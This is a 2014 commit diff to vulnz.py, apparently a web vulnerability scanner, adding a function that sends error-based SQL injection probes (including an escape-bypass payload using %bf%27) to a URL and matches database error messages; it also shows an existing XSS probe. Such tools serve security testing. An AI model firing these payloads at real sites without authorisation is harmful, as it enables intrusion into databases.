02c19b876d0568771b7a580c07cb6d71188ec2c5
zigoo0 <zigoo0@users.noreply.github.com>
2014-05-20 00:20:58 +0300

    Update vulnz.py

--- vulnz.py
+++ vulnz.py
@@ -70,4 +70,15 @@ def xss_func(url):
         check = re.compile('zigoo0<svg|x>x', re.I)
         main_function(url, payloads, check)
 
-
+def error_based_sqli_func(url):
+	print ga.bold+"\n [!] Now Scanning for Error Based SQL Injection "+ga.end
+	print ga.blue+" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases "+ga.end
+	print ga.blue+" [!] Please wait ...."+ga.end
+	# Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'
+	# add chinese char to the SQLI payloads to bypass mysql_escape_char
+	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
+	# Still waiting for ORACLE, MYSQL Signatures to be added.
+	# MYSQL = SQL syntax
+	# MSSQL - Input string
+	check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
+	main_function(url, payloads, check)
